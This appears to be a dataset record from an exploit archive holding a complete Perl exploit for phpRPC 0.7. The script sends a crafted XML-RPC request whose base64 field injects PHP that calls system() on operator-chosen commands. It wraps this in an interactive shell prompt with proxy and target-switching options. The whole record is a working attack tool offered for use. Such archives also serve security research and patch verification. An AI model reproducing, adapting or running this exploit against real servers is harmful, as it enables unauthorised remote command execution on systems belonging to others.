{
  "id": "1546",
  "title": "phpRPC Library 0.7 - XML Data Decoding Remote Code Execution (2)",
  "cve": null,
  "vuln_type": "rce",
  "code": "#!/usr/bin/perl\r\n#\r\n# phpRPC <=0.7 Remote Command Execution Exploit\r\n#\r\n# based on: http://www.gulftech.org/?node=research&article_id=00105-02262006\r\n#\r\n# Copyright (c) 2006 cijfer <cijfer@netti!fi>\r\n# All rights reserved.\r\n#\r\n# never ctrl+c again.\r\n# cijfer$ http://target.com/dir\r\n# host changed to 'http://target.com/dir'\r\n# cijfer$ \r\n#\r\n# $Id: cijfer-prpcxpl.pl,v 0.1 2006/03/01 05:46:00 cijfer Exp $\r\n\r\nuse LWP::UserAgent;\r\nuse URI::Escape;\r\nuse Getopt::Long;\r\nuse Term::ANSIColor;\r\n\r\n$res  = GetOptions(\"host=s\" => \\$host, \"proxy=s\" => \\$proxy, \"verbose+\" => \\$verbose);\r\n&usage unless $host;\r\n\r\nwhile()\r\n{\r\n\tprint color(\"green\"), \"cijfer\\$ \", color(\"reset\");\r\n\tchomp($command = <STDIN>);\r\n\texit unless $command;\r\n\tif($command =~ m/^http:\\/\\/(.*)/g)\r\n\t{\r\n\t\t$host=\"http://\".$1;\r\n\t\tprint \"host changed to '\";\r\n\t\tprint color(\"bold\"), $host.\"'\\n\", color(\"reset\");\r\n\t}\r\n\telse\r\n\t{\r\n\t\t&exploit($command,$host);\r\n\t}\r\n}\r\n\r\nsub usage\r\n{\r\n\tprint \"phpRPC <=0.7 Remote Command Execution Exploit\\n\";\r\n\tprint \"usage: $0 -hpv\\n\\n\";\r\n\tprint \"  -h, --host\\t\\tfull address of target (ex. http://www.website.com/dir)\\n\";\r\n\tprint \"  -p, --proxy\\t\\tprovide an HTTP proxy (ex. 0.0.0.0:8080)\\n\";\r\n\tprint \"  -v, --verbose\\t\\tverbose mode (debug)\\n\\n\";\r\n\texit;\r\n}\r\n\r\nsub exploit\r\n{\r\n\tmy($command,$host) = @_;\r\n\r\n\t$cij=LWP::UserAgent->new() or die;\r\n\t$cij->agent(\"Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:2.0) Gecko/20060101\");\r\n\t$cij->proxy(\"http\", \"http://\".$proxy.\"/\") unless !$proxy;\r\n\r\n\t$string  = shift;\r\n\t$xml     = \"<?xml version=\\\"1.0\\\"?>\";\r\n\t$xml    .= \"<methodCall>\";\r\n\t$xml    .= \"<methodName>cijfer\";\r\n\t$xml    .= \"    <params>\";\r\n\t$xml    .= \"\t    <param>\";\r\n\t$xml    .= \"\t    <value><base64>'));echo\\\"_cijfer_\\n\\\";system('\".$string.\"');echo\\\"_cijfer_\\\";exit();\";\r\n\t$xml    .= \"\t    </param>\";\r\n\t$xml    .= \"    </params>\";\r\n\t$xml    .= \"</methodCall>\";\r\n\r\n\t$req=new HTTP::Request 'POST'=>$host.\"/modules/phpRPC/server.php\";\r\n\t$req->content_type(\"text/xml\");\r\n\t$req->content($xml);\r\n\t$out=$cij->request($req);\r\n\r\n\tif($out->is_success)\r\n\t{\r\n\t\t@cij=split(\"_cijfer_\",$out->content);\r\n\t\tprint substr(@cij[1],1);\r\n\t}\r\n\r\n\tif($verbose)\r\n\t{\r\n\t\t$recv=length $out->content;\r\n\t\tprint \"Total received bytes: \".$recv.\"\\n\";\r\n\t\t$sent=length $command;\r\n\t\tprint \"Total sent bytes: \".$sent.\"\\n\";\r\n\t}\r\n}\r\n\r\n# milw0rm.com [2006-03-02]",
  "url": "https://www.exploit-db.com/exploits/1546"
}